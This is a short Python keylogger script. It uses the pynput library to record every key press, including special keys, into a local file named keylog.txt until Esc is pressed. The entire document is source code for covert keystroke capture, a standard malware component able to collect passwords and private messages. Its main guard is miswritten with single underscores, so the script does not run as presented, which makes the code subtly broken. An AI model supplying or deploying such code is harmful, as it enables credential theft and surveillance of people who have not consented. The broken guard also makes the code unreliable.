import pynput.keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        # Some special keys like 'shift', 'ctrl', etc., don't have a char attribute
        if str(key) == "Key.space":
            with open("keylog.txt", "a") as f:
                f.write(" \n")
        else:
            with open("keylog.txt", "a") as f:
                f.write(f"{key} \n")

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        # Stop the listener
        return False

def start_keylogger():
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if _name_ == "_main_":
    start_keylogger()